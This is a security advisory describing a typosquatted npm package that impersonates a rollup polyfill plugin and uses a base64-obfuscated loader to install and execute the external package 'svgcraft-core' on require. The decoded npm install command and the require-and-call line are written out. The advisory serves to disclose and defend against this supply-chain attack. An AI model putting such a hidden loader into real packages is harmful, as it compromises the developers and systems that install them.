summary: Typosquat of rollup-plugin-node-polyfills fetches and executes external npm package on require
details: Package name `rollup-runtime-polyfill-core` and its README impersonate the legitimate `rollup-plugin-node-polyfills` / `rollup-plugin-polyfill-node` project (repository URL points at FredKSchott/rollup-plugin-polyfill-node, README copied from the legitimate fork). The declared CJS main `dist/index.js` runs a loader at module top level that base64-decodes both a shell command and a module name, spawns `npm install svgcraft-core --no-save --silent --no-audit --no-fund`, and on child exit calls `require('svgcraft-core').getPlugin()()`. This causes any consumer that `require()`s this package to fetch and execute an external, author-controlled npm package inside the installer/consumer process. Both the command string and the require target are stored as base64 literals decoded at runtime, hiding them from simple string scans. There is no legitimate reason for a rollup polyfill plugin to install and execute an unrelated package under an obfuscated name.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
